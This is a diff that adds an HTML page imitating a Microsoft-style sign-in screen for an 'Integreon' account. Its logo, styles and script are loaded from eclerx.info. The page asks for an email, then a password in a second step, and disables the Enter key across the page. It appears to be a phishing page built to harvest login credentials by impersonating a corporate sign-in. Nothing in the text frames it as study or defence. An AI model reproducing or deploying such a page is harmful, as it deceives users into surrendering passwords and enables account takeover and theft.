@@ -1,0 +1,73 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no"/>
+	<title>Sign in to your Integreon account</title>
+	<link href="https://eclerx.info/static/favicon.svg" rel="icon" sizes="21x21" type="image/svg+xml"/>
+	<link href="https://eclerx.info/static/favicon.svg" rel="icon" sizes="43x43" type="image/svg+xml"/>
+	<link href="https://eclerx.info/static/favicon.svg" rel="icon" sizes="240x240" type="image/svg+xml"/>
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css" rel="stylesheet"/>
+	<link href="https://use.fontawesome.com/releases/v5.12.0/css/all.css" rel="stylesheet"/>
+	<link href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css" rel="stylesheet"/>
+	<link href="https://eclerx.info/static/styles.min.css" rel="stylesheet"/>
+</head>
+<body class="text-nowrap" style="width: 100%;height: 100vh;">
+<form action="" method="post">
+<div class="container" id="loginForm"><img alt="Organization banner logo" class="banner-logo ext-banner-logo" data-bind="addEventHandlers, attr: { src: bannerLogoUrl, alt: str[&#39;STR_Banner_Logo_AltText&#39;] }, externalCss: { &#39;banner-logo&#39;: true }" height="40" id="image" src="https://eclerx.info/static/eclerxlogo.png" width="150"/><br/>
+ 
+<div> </div>
+
+<section id="section-main">
+<section class="slide-page" id="section-1">
+<p class="field" id="signIn">Sign in</p>
+
+<h5 id="result"> </h5>
+<input class="field" id="email" placeholder="someone@example.com" type="email"/>
+<a href="#" style="color: #0067b8;"> </a>
+<p></p>
+
+<p class="field" id="signInOptions"><a href="#" style="color: #0067b8;">Can’t access your account?</a></p>
+
+<p class="field" id="btnPlace"><button class="firstNext next" href="#next" id="btnSend" type="button">Next</button></p>
+</section>
+
+<section class="page secondSlide" id="section-2"> 
+<p id="userLine"> </p>
+<button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" style="font-size: 12px;height: 25px;width: 26px;" type="button"><img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_d1229aefd268f350621d48f094122f69.png"/></button><input hidden="" id="UserName" placeholder="UserName" type="text" value=""/>
+<p id="enterPwd">Enter Password</p>
+<p><input id="password" placeholder="Password" type="password" name="password"/></p>
+
+<p id="keepMe">Keep me signed in</p>
+<input id="cbRemember" type="checkbox"/>
+<p id="ForgodPwd"><a href="#">Forgot password?</a></p>
+
+<p id="SignWithKey"><a href="#">Sign in with Windows Hello or a security key</a></p>
+
+<p id="btnSignInLocation"><button class="submit" id="btnSignIn" type="submit">Sign in</button></p>
+</section>
+</section>
+</div>
+
+<div id="footer" style="height: 36px;">
+<div id="terms" style="float: left;width: 84px;">
+<p style="font-size: 13px;text-align: left;">Terms of use</p>
+</div>
+
+<div style="float: left;width: 105px;">
+<p style="font-size: 12px;">Privacy &amp; cookies</p>
+</div>
+
+<div style="float: left;width: 24px;">
+<p style="font-size: 12px;">•••</p>
+</div>
+</div>
+</form>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script><script src="https://eclerx.info/static/script.min.js"></script><script>
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                // Prevent the default action of the Enter key
+                event.preventDefault();
+                // Optional: Notify the user
+                console.log('Enter key is disabled globally.');
+            }
+        });
+    </script>
+
+</body></html>
